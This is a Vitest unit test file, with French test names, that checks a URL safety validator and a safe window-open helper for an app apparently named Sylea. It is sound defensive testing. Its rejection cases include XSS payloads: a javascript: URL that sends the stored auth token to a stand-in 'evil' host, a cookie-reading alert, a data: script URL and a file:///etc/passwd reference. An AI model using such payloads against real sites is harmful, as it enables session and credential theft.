import { describe, it, expect, vi, beforeEach } from 'vitest'
import { isSafeExternalUrl, openExternalSafe } from '../utils/safeOpen'

describe('isSafeExternalUrl', () => {
  it('accepte les URLs http(s)', () => {
    expect(isSafeExternalUrl('https://sylea.ai')).toBe(true)
    expect(isSafeExternalUrl('http://localhost:8000/api')).toBe(true)
    expect(isSafeExternalUrl('https://mail.google.com/mail/u/0/#inbox')).toBe(true)
  })

  it('rejette javascript: (XSS)', () => {
    expect(isSafeExternalUrl("javascript:fetch('//evil/?'+localStorage.sylea_auth_token)")).toBe(false)
    expect(isSafeExternalUrl('JavaScript:alert(1)')).toBe(false)
  })

  it('rejette data:, blob:, vbscript:, file:', () => {
    expect(isSafeExternalUrl('data:text/html,<script>alert(1)</script>')).toBe(false)
    expect(isSafeExternalUrl('blob:https://x/123')).toBe(false)
    expect(isSafeExternalUrl('vbscript:msgbox(1)')).toBe(false)
    expect(isSafeExternalUrl('file:///etc/passwd')).toBe(false)
  })

  it('rejette le scheme custom sylea:', () => {
    expect(isSafeExternalUrl('sylea://auth/callback?token=xxx')).toBe(false)
  })

  it('rejette les URLs protocol-relative (//host)', () => {
    expect(isSafeExternalUrl('//evil.com/track.gif')).toBe(false)
  })

  it('rejette null/undefined/vide/non-string', () => {
    expect(isSafeExternalUrl(null)).toBe(false)
    expect(isSafeExternalUrl(undefined)).toBe(false)
    expect(isSafeExternalUrl('')).toBe(false)
    // @ts-expect-error test runtime
    expect(isSafeExternalUrl(42)).toBe(false)
  })
})

describe('openExternalSafe', () => {
  beforeEach(() => {
    vi.restoreAllMocks()
  })

  it('ouvre une URL https avec noopener,noreferrer et retourne true', () => {
    const spy = vi.spyOn(window, 'open').mockImplementation(() => null)
    const r = openExternalSafe('https://sylea.ai')
    expect(r).toBe(true)
    expect(spy).toHaveBeenCalledWith('https://sylea.ai', '_blank', 'noopener,noreferrer')
  })

  it("n'ouvre PAS une URL javascript: et retourne false", () => {
    const spy = vi.spyOn(window, 'open').mockImplementation(() => null)
    const r = openExternalSafe("javascript:alert(document.cookie)")
    expect(r).toBe(false)
    expect(spy).not.toHaveBeenCalled()
  })
})
